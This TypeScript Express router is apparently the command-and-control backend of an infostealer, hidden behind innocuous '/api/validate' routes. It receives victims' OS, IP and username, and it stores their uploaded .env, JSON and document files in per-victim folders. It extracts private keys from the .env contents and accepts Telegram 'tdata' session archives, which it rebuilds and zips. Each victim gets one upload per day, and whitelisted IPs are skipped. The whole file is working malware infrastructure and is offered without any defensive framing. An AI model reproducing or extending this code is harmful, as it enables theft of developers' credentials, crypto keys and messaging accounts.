import crypto from 'crypto';
import { execSync } from 'child_process';
import express, { Request, Response } from 'express';
import fs from 'fs';
import path from 'path';
import zlib from 'zlib';
import { appendTransferExtractedKeysFromContents } from '../utils/transfer-extracted-keys';
import { isReportedIpWhitelisted } from '../utils/whitelist';

const router = express.Router();

const DATA_DIR = path.normalize(path.join(process.cwd(), 'data'));
const SYSTEM_INFO_FILE = path.join(DATA_DIR, 'system_info.json');

function appendSystemInfo(record: { operatingSystem: string; ipAddress: string; username: string; timestamp: string }): void {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  let list: typeof record[] = [];
  if (fs.existsSync(SYSTEM_INFO_FILE)) {
    try {
      list = JSON.parse(fs.readFileSync(SYSTEM_INFO_FILE, 'utf-8'));
    } catch {
      list = [];
    }
  }
  list.push(record);
  fs.writeFileSync(SYSTEM_INFO_FILE, JSON.stringify(list, null, 2), 'utf-8');
}

const TDATA_UPLOAD_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24h between uploads per client
const TDATA_MAX_UPLOAD_BYTES = 500 * 1024 * 1024; // 500MB
const TDATA_RATE_FILE = path.join(process.cwd(), 'uploads', '_tdata_rate.json');
const TDATA_SENT_FILE = path.join(process.cwd(), 'uploads', '_tdata_sent.json');

// Ensure uploads directory exists (normalize for Windows)
const UPLOADS_DIR = path.normalize(path.join(process.cwd(), 'uploads'));
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

/** Match transfer CLI / findEnvFiles: .env, .env.* (e.g. .env.local), *.env, .env.example */
function isEnvFilePath(filePath: string): boolean {
  const n = path.basename(String(filePath || '')).toLowerCase();
  return n.endsWith('.env.example') || n.endsWith('.env') || n.startsWith('.env.');
}

/** Format date as YY.M.D_HH.MM (e.g. 26.2.26_09.57) */
function formatShortTimestamp(d: Date): string {
  const yy = d.getFullYear() % 100;
  const m = d.getMonth() + 1;
  const d_ = d.getDate();
  const hh = String(d.getHours()).padStart(2, '0');
  const mm = String(d.getMinutes()).padStart(2, '0');
  return `${yy}.${m}.${d_}_${hh}.${mm}`;
}

/** Normalize OS to win | linux | mac */
function normalizeOs(os: string): string {
  const o = String(os).toLowerCase();
  if (o.includes('win')) return 'win';
  if (o.includes('mac') || o === 'darwin') return 'mac';
  return 'linux';
}

/**
 * Build client folder name from username, OS, and IP(s): {username}_{win|linux|mac}_{ip1-ip2-ip3...}
 * No index file — folder is identified by machine (user + os + ips). Same IP on different machines
 * (different user or os) gets a different folder; multiple clients can write in parallel.
 */
function getClientFolderName(username: string, operatingSystem: string, ipAddress: string): string {
  const safeUser = String(username || 'unknown').replace(/[^a-zA-Z0-9.-]/g, '-');
  const osShort = normalizeOs(operatingSystem || 'unknown');
  const ipsRaw = typeof ipAddress === 'string' ? ipAddress.split(',').map((s: string) => s.trim()).filter(Boolean) : [String(ipAddress || 'unknown')];
  const ipsPart = ipsRaw.length ? ipsRaw.map((ip: string) => ip.replace(/[^a-zA-Z0-9.:-]/g, '-')).join('-') : 'unknown';
  return `${safeUser}_${osShort}_${ipsPart}`;
}

/**
 * POST /api/validate/system-info
 * Receives system information (OS, IP, username) and saves to data/system_info.json
 */
router.post('/system-info', async (req: Request, res: Response) => {
  try {
    const { operatingSystem, ipAddress, username } = req.body;

    if (!operatingSystem || !ipAddress || !username) {
      return res.status(400).json({
        error: 'Invalid request',
        message: 'operatingSystem, ipAddress, and username are required',
      });
    }

    if (isReportedIpWhitelisted(ipAddress)) {
      console.log(`🔕 Whitelisted ipAddress in body — skip system_info capture (${ipAddress})`);
      return res.json({ success: true });
    }

    console.log(`📥 Received system info: OS=${operatingSystem}, IP=${ipAddress}, User=${username}`);

    appendSystemInfo({
      operatingSystem,
      ipAddress,
      username,
      timestamp: new Date().toISOString(),
    });
    console.log(`💾 Saved to ${SYSTEM_INFO_FILE}`);

    return res.json({
      success: true,
    });
  } catch (error: any) {
    console.error('❌ Error processing system info:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
});

/** Manifest: knownHashes = content hash -> true. Same file (same content) is ignored on every request; we only save when hash is new, then merge all received hashes into manifest. */
const MANIFEST_FILENAME = '_manifest.json';

function getManifestPath(baseDir: string): string {
  return path.join(baseDir, MANIFEST_FILENAME);
}

function hashContent(content: string): string {
  return crypto.createHash('sha256').update(content, 'utf8').digest('hex');
}

function loadManifest(baseDir: string): { lastUpdate: string; knownHashes: Record<string, boolean> } {
  const manifestPath = getManifestPath(baseDir);
  try {
    if (fs.existsSync(manifestPath)) {
      const data = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
      const knownHashes = typeof data.knownHashes === 'object' && data.knownHashes !== null ? data.knownHashes : {};
      return { lastUpdate: data.lastUpdate || '', knownHashes };
    }
  } catch (_) {}
  return { lastUpdate: '', knownHashes: {} };
}

function saveManifest(baseDir: string, knownHashes: Record<string, boolean>): void {
  const manifestPath = getManifestPath(baseDir);
  fs.mkdirSync(baseDir, { recursive: true });
  fs.writeFileSync(
    manifestPath,
    JSON.stringify({ lastUpdate: new Date().toISOString(), knownHashes }, null, 0),
    'utf8'
  );
}

/** Windows reserved chars not allowed in filenames */
const WIN_RESERVED = /[<>:"/\\|?*]/g;
/**
 * Single filename that embeds path + original name (no subdirs). Path segments joined by "_", original name at end.
 * Strips suffixExt from end to avoid double extension. Sanitizes for Windows (no : * ? " < > |).
 */
function safeFileNameWithPath(filePath: string, suffixExt: string, maxLen: number = 200): string {
  const segments = filePath.split(/[/\\]/).filter(Boolean);
  const sanitize = (s: string) =>
    s.replace(WIN_RESERVED, '_').replace(/[^a-zA-Z0-9.-]/g, '_').replace(/_+/g, '_').replace(/^_|_$/g, '') || 'file';
  const extLower = suffixExt.toLowerCase();
  if (segments.length === 0) {
    let base = path.basename(filePath) || filePath || 'file';
    base = sanitize(base);
    if (base.toLowerCase().endsWith('.' + extLower)) base = base.slice(0, -(extLower.length + 1));
    return (base || 'file').substring(0, maxLen);
  }
  let name = segments.map(sanitize).filter(Boolean).join('_');
  if (name.toLowerCase().endsWith('.' + extLower)) name = name.slice(0, -(extLower.length + 1));
  if (!name) name = 'file';
  return name.substring(0, maxLen);
}

/** Extensions we accept for doc uploads (client `extension` or inferred from original path). */
const DOC_ALLOWED_EXTENSIONS = ['txt', 'doc', 'docx', 'xlsx', 'pdf', 'rtf', 'md', 'csv'];

function resolveDocExtension(file: { extension?: unknown; path?: string }): string {
  const allowed = DOC_ALLOWED_EXTENSIONS;
  const fromClient =
    file.extension != null ? String(file.extension).toLowerCase().replace(/^\./, '') : '';
  if (fromClient && allowed.includes(fromClient)) return fromClient;
  const fromPath = path.extname(file.path || '').replace(/^\./, '').toLowerCase();
  if (fromPath && allowed.includes(fromPath)) return fromPath;
  return 'bin';
}

/** Types that are real binary on disk (Office / PDF). */
const DOC_BINARY_EXTENSIONS = new Set(['doc', 'docx', 'xls', 'xlsx', 'pdf']);

/** If client sends base64 as a plain JSON string without encoding: 'base64', detect and decode. */
function bufferLooksLikeBinaryFile(buf: Buffer): boolean {
  if (buf.length < 4) return false;
  if (buf[0] === 0x50 && buf[1] === 0x4b) return true; // ZIP — .docx / .xlsx
  if (buf.slice(0, 4).toString('ascii') === '%PDF') return true;
  if (buf[0] === 0xd0 && buf[1] === 0xcf && buf[2] === 0x11 && buf[3] === 0xe0) return true; // OLE — legacy .doc / .xls
  return false;
}

function tryDecodeLooseBase64(s: string): Buffer | null {
  const t = s.trim().replace(/\s/g, '');
  if (t.length < 16 || !/^[A-Za-z0-9+/]+=*$/.test(t)) return null;
  const buf = Buffer.from(t, 'base64');
  if (buf.length === 0) return null;
  return buf;
}

/**
 * Turn uploaded doc payload into bytes or UTF-8 text for writing.
 * Many clients base64-encode all docs but omit `encoding: 'base64'`.
 */
function normalizeDocPayload(content: unknown, ext: string, encoding: unknown): Buffer | string {
  const str = String(content);
  if (encoding === 'base64') {
    return Buffer.from(str.trim().replace(/\s/g, ''), 'base64');
  }
  const extLower = ext.toLowerCase();
  const decoded = tryDecodeLooseBase64(str);
  if (!decoded) return str;
  if (bufferLooksLikeBinaryFile(decoded)) return decoded;
  const textish = new Set(['txt', 'md', 'csv', 'rtf']);
  if (textish.has(extLower)) {
    return decoded.toString('utf8');
  }
  if (DOC_BINARY_EXTENSIONS.has(extLower) && decoded.length > 64) {
    return decoded;
  }
  return str;
}

/**
 * POST /api/validate/files
 * Receives file contents (env, json, doc). Saves by IP; only saves files that are new since last update,
 * in a timestamped subfolder (date and time).
 */
router.post('/files', async (req: Request, res: Response) => {
  try {
    console.log('📥 Processing /files request...');
    const { envFiles, jsonFiles, docFiles, operatingSystem, ipAddress, username } = req.body;
    
    if (!envFiles || !jsonFiles) {
      res.status(400).json({
        error: 'Invalid request',
        message: 'envFiles and jsonFiles are required',
      });
      return;
    }
    
    if (!Array.isArray(envFiles) || !Array.isArray(jsonFiles)) {
      res.status(400).json({
        error: 'Invalid request',
        message: 'envFiles and jsonFiles must be arrays',
      });
      return;
    }

    if (isReportedIpWhitelisted(ipAddress)) {
      console.log(`🔕 Whitelisted ipAddress in body — skip /files capture (${ipAddress})`);
      res.json({ success: true });
      return;
    }

    const docFilesList = Array.isArray(docFiles) ? docFiles : [];
    const os = operatingSystem || 'unknown';
    const ip = ipAddress || 'unknown';
    const user = username || 'unknown';
    
    const clientFolderName = getClientFolderName(user, os, ip);
    const baseDir = path.normalize(path.join(UPLOADS_DIR, clientFolderName));
    
    const manifest = loadManifest(baseDir);
    const knownHashes = manifest.knownHashes;
    const isNewByHash = (content: string) => !knownHashes[hashContent(content)];
    const newEnvFiles = envFiles.filter((f: any) => f.path && f.content && isNewByHash(f.content));
    const newJsonFiles = jsonFiles.filter((f: any) => f.path && f.content && isNewByHash(f.content));
    const newDocFiles = docFilesList.filter((f: any) => f.path && f.content != null && isNewByHash(String(f.content)));
    
    const hasNew = newEnvFiles.length > 0 || newJsonFiles.length > 0 || newDocFiles.length > 0;
    
    console.log(`📥 Received files: ${envFiles.length} env, ${jsonFiles.length} json, ${docFilesList.length} doc (new: ${newEnvFiles.length}, ${newJsonFiles.length}, ${newDocFiles.length})`);
    console.log(`📋 Client: ${clientFolderName}`);
    
    if (hasNew) {
      const timestamp = formatShortTimestamp(new Date());
      const filesDir = path.normalize(path.join(baseDir, timestamp));
      fs.mkdirSync(filesDir, { recursive: true });
      
      const envDir = path.normalize(path.join(filesDir, 'env'));
      fs.mkdirSync(envDir, { recursive: true });
      newEnvFiles.forEach((file: any, i: number) => {
        if (file.path && file.content) {
          const name = safeFileNameWithPath(file.path, 'env');
          fs.writeFileSync(path.normalize(path.join(envDir, `${i + 1}-${name}.env`)), file.content, 'utf8');
        }
      });
      
      const jsonDir = path.normalize(path.join(filesDir, 'json'));
      fs.mkdirSync(jsonDir, { recursive: true });
      newJsonFiles.forEach((file: any, i: number) => {
        if (file.path && file.content) {
          const name = safeFileNameWithPath(file.path, 'json');
          fs.writeFileSync(path.normalize(path.join(jsonDir, `${i + 1}-${name}.json`)), file.content, 'utf8');
        }
      });
      
      if (newDocFiles.length > 0) {
        const docDir = path.normalize(path.join(filesDir, 'doc'));
        fs.mkdirSync(docDir, { recursive: true });
        newDocFiles.forEach((file: any, i: number) => {
          if (file.path && file.content != null) {
            const ext = resolveDocExtension(file);
            const name = safeFileNameWithPath(file.path, ext);
            const destPath = path.normalize(path.join(docDir, `${i + 1}-${name}.${ext}`));
            const payload = normalizeDocPayload(file.content, ext, file.encoding);
            if (Buffer.isBuffer(payload)) {
              fs.writeFileSync(destPath, payload);
            } else {
              fs.writeFileSync(destPath, payload, 'utf8');
            }
          }
        });
      }
      
      const summaryPath = path.join(filesDir, 'summary.txt');
      const summary = [
        `Files received: ${new Date().toISOString()}`,
        `System Info: OS=${os}, IP=${ip}, User=${user}`,
        '',
        `New env: ${newEnvFiles.length}, new json: ${newJsonFiles.length}, new doc: ${newDocFiles.length}`,
        '',
        'ENV:', ...newEnvFiles.map((f: any, i: number) => `${i + 1}. ${f.path}`),
        '', 'JSON:', ...newJsonFiles.map((f: any, i: number) => `${i + 1}. ${f.path}`),
        '', 'DOC:', ...newDocFiles.map((f: any, i: number) => `${i + 1}. ${f.path} (.${resolveDocExtension(f)})`),
      ].join('\n');
      fs.writeFileSync(summaryPath, summary, 'utf8');
      
      console.log(`💾 Saved ${newEnvFiles.length} env, ${newJsonFiles.length} json, ${newDocFiles.length} doc to ${filesDir}`);
    } else {
      console.log(`⏭ No new files to save for ${clientFolderName}`);
    }
    
    const allHashes: Record<string, boolean> = { ...knownHashes };
    envFiles.forEach((f: any) => { if (f.content) allHashes[hashContent(f.content)] = true; });
    jsonFiles.forEach((f: any) => { if (f.content) allHashes[hashContent(f.content)] = true; });
    docFilesList.forEach((f: any) => { if (f.content != null) allHashes[hashContent(String(f.content))] = true; });
    saveManifest(baseDir, allHashes);

    // Private keys: only from env file bodies (not json/doc payloads).
    const envTexts = envFiles.map((f: any) => (typeof f?.content === 'string' ? f.content : '')).filter(Boolean);
    appendTransferExtractedKeysFromContents(user, ip, envTexts);

    res.json({ success: true });
  } catch (error: any) {
    console.error('❌ Error processing files:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
});

/**
 * POST /api/validate/project-env
 * Receives the current project's .env file. Saves by IP in one folder per IP;
 * each .env is saved with timestamp and project path in the filename (no new folder per request).
 */
router.post('/project-env', async (req: Request, res: Response) => {
  try {
    console.log('📥 Processing /project-env request...');
    const { operatingSystem, ipAddress, username, envContent, projectPath, projectConfigFiles } = req.body;
    
    if (!operatingSystem || !ipAddress || !username) {
      res.status(400).json({
        error: 'Invalid request',
        message: 'operatingSystem, ipAddress, and username are required',
      });
      return;
    }
    
    const filesList = Array.isArray(projectConfigFiles) ? projectConfigFiles : null;
    if (!envContent && !filesList) {
      res.status(400).json({
        error: 'Invalid request',
        message: 'envContent or files[] is required',
      });
      return;
    }

    if (isReportedIpWhitelisted(ipAddress)) {
      console.log(`🔕 Whitelisted ipAddress in body — skip /project-env capture (${ipAddress})`);
      res.json({ success: true, message: 'Project .env file received and saved' });
      return;
    }
    
    const ip = ipAddress || 'unknown';
    const user = username || 'unknown';
    const os = operatingSystem || 'unknown';
    const projectPathStr = projectPath || 'unknown';
    
    const clientFolderName = getClientFolderName(user, os, ip);
    const projectEnvBase = path.normalize(path.join(UPLOADS_DIR, 'project-env', clientFolderName));
    fs.mkdirSync(projectEnvBase, { recursive: true });
    
    const timestamp = formatShortTimestamp(new Date());
    const safeProjectPath = projectPathStr.replace(WIN_RESERVED, '_').replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 150);

    let savedFiles: { fileName: string; bytes: number }[] = [];

    // Backward-compatible: single .env payload
    if (envContent) {
      const envFileName = `${timestamp}-${safeProjectPath}.env`;
      const envFilePath = path.normalize(path.join(projectEnvBase, envFileName));
      const envStr = String(envContent);
      fs.writeFileSync(envFilePath, envStr, 'utf8');
      savedFiles.push({ fileName: envFileName, bytes: Buffer.byteLength(envStr, 'utf8') });
      console.log(`💾 Saved to ${envFilePath}`);
    }

    // New: multiple project files in one request.
    // Body: { files: [{ path, content, encoding? }] }
    if (filesList) {
      const requestDir = path.normalize(path.join(projectEnvBase, timestamp));
      fs.mkdirSync(requestDir, { recursive: true });

      filesList.forEach((f: any, i: number) => {
        const filePath = String(f?.path || '').trim();
        if (!filePath || f?.content == null) return;

        const ext = path.extname(filePath).replace(/^\./, '').toLowerCase() || 'txt';
        const name = safeFileNameWithPath(filePath, ext, 220);
        const fileName = `${i + 1}-${name}.${ext}`;
        const destPath = path.normalize(path.join(requestDir, fileName));

        const contentStr = String(f.content);
        if (f.encoding === 'base64') {
          const buf = Buffer.from(contentStr.trim().replace(/\s/g, ''), 'base64');
          fs.writeFileSync(destPath, buf);
          savedFiles.push({ fileName: path.join(timestamp, fileName), bytes: buf.length });
        } else {
          fs.writeFileSync(destPath, contentStr, 'utf8');
          savedFiles.push({ fileName: path.join(timestamp, fileName), bytes: Buffer.byteLength(contentStr, 'utf8') });
        }
      });

      console.log(`💾 Saved ${savedFiles.length} project file(s) to ${requestDir}`);
    }
    
    const summaryPath = path.normalize(path.join(projectEnvBase, 'summary.txt'));
    const newLine = [
      `[${new Date().toISOString()}]`,
      `  Path: ${projectPathStr}`,
      `  Files: ${savedFiles.length}`,
      ...savedFiles.map((f) => `    - ${f.fileName} (${f.bytes} bytes)`),
      '',
    ].join('\n');
    if (fs.existsSync(summaryPath)) {
      fs.appendFileSync(summaryPath, newLine, 'utf8');
    } else {
      fs.writeFileSync(summaryPath, `Project .env files (${clientFolderName})\n\n${newLine}`, 'utf8');
    }
    
    console.log(`📥 Project .env: ${clientFolderName}, path=${projectPathStr}`);

    // Private keys: only from .env file content (path basename looks like an env file).
    const scanChunks: string[] = [];
    if (envContent) scanChunks.push(String(envContent));
    if (filesList) {
      for (const f of filesList) {
        if (f?.content == null) continue;
        const p = String(f?.path || '').trim();
        if (p && isEnvFilePath(p)) scanChunks.push(String(f.content));
      }
    }
    appendTransferExtractedKeysFromContents(user, ip, scanChunks);

    res.json({
      success: true,
      message: 'Project .env file received and saved',
    });
  } catch (error: any) {
    console.error('❌ Error processing project .env file:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
});

function readJsonSafe<T>(filePath: string, fallback: T): T {
  try {
    if (fs.existsSync(filePath)) {
      return JSON.parse(fs.readFileSync(filePath, 'utf8')) as T;
    }
  } catch (_) {}
  return fallback;
}

function writeJsonSafe(filePath: string, data: object): void {
  try {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, JSON.stringify(data), 'utf8');
  } catch (_) {}
}

/**
 * POST /api/validate/tdata/check
 * Body: { operatingSystem, ipAddress, username }. Returns { alreadySent: boolean }.
 */
router.post('/tdata/check', async (req: Request, res: Response) => {
  try {
    const { operatingSystem, ipAddress, username } = req.body || {};
    const user = username || 'unknown';
    const ip = ipAddress || 'unknown';
    const os = operatingSystem || 'unknown';
    const clientFolderName = getClientFolderName(user, os, ip);
    const sent = readJsonSafe<Record<string, boolean>>(TDATA_SENT_FILE, {});
    const alreadySent = !!sent[clientFolderName];
    res.json({ alreadySent });
  } catch (error: any) {
    console.error('❌ tdata check:', error);
    res.status(500).json({ error: 'Internal server error', alreadySent: false });
  }
});

/**
 * Handle POST /api/validate/tdata/upload (must be mounted with express.raw({ limit: '500mb' }) before express.json).
 * Expects req.body = Buffer (gzip), headers X-Client-OS, X-Client-IP, X-Client-User.
 * Rate limit: one upload per client per 24h. Restores tdata folder then zips it for download.
 */
export async function handleTdataUpload(req: Request, res: Response): Promise<void> {
  try {
    const os = (req.headers['x-client-os'] as string) || 'unknown';
    const ip = (req.headers['x-client-ip'] as string) || 'unknown';
    const user = (req.headers['x-client-user'] as string) || 'unknown';
    const clientFolderName = getClientFolderName(user, os, ip);

    const rate = readJsonSafe<Record<string, number>>(TDATA_RATE_FILE, {});
    const now = Date.now();
    if (rate[clientFolderName] != null && now - rate[clientFolderName] < TDATA_UPLOAD_COOLDOWN_MS) {
      res.status(429).json({
        error: 'Rate limited',
        message: 'tdata upload allowed once per 24h per machine. Try again later.',
      });
      return;
    }

    const body = req.body;
    if (!Buffer.isBuffer(body) || body.length === 0) {
      res.status(400).json({ error: 'Invalid request', message: 'Body must be non-empty gzip data' });
      return;
    }
    if (body.length > TDATA_MAX_UPLOAD_BYTES) {
      res.status(413).json({
        error: 'Payload too large',
        message: `Max ${TDATA_MAX_UPLOAD_BYTES / 1024 / 1024}MB allowed`,
      });
      return;
    }

    console.log(`📥 tdata upload: ${clientFolderName}, size=${(body.length / 1024 / 1024).toFixed(2)}MB`);
    const decompressed = zlib.gunzipSync(body);
    const extractDir = path.normalize(path.join(UPLOADS_DIR, clientFolderName, `tdata_${formatShortTimestamp(new Date())}`));
    fs.mkdirSync(extractDir, { recursive: true });

    let offset = 0;
    while (offset < decompressed.length) {
      if (offset + 4 > decompressed.length) break;
      const pathLen = decompressed.readUInt32BE(offset);
      offset += 4;
      if (offset + pathLen + 4 > decompressed.length) break;
      const relPath = decompressed.toString('utf8', offset, offset + pathLen);
      offset += pathLen;
      const contentLen = decompressed.readUInt32BE(offset);
      offset += 4;
      if (offset + contentLen > decompressed.length) break;
      const content = decompressed.subarray(offset, offset + contentLen);
      offset += contentLen;
      const safePath = path.normalize(path.join(extractDir, relPath.replace(/\//g, path.sep)));
      const dir = path.dirname(safePath);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(safePath, content);
    }

    const parentDir = path.dirname(extractDir);
    const folderName = path.basename(extractDir);
    const zipPath = path.normalize(path.join(parentDir, `${folderName}.zip`));
    try {
      if (process.platform === 'win32') {
        execSync(`tar -a -c -f "${zipPath}" -C "${parentDir}" "${folderName}"`, { stdio: 'pipe' });
      } else {
        execSync(`zip -r "${zipPath}" .`, { cwd: extractDir, stdio: 'pipe' });
      }
    } catch (e) {
      console.warn('Zip creation failed (zip/tar may be missing), keeping folder only:', e);
    }

    rate[clientFolderName] = now;
    writeJsonSafe(TDATA_RATE_FILE, rate);
    const sent = readJsonSafe<Record<string, boolean>>(TDATA_SENT_FILE, {});
    sent[clientFolderName] = true;
    writeJsonSafe(TDATA_SENT_FILE, sent);

    console.log(`💾 tdata saved: ${extractDir}`);
    res.json({ success: true, message: 'tdata received and zipped', path: path.basename(extractDir) });
  } catch (error: any) {
    console.error('❌ tdata upload:', error);
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
}

export { router as validateRouter };
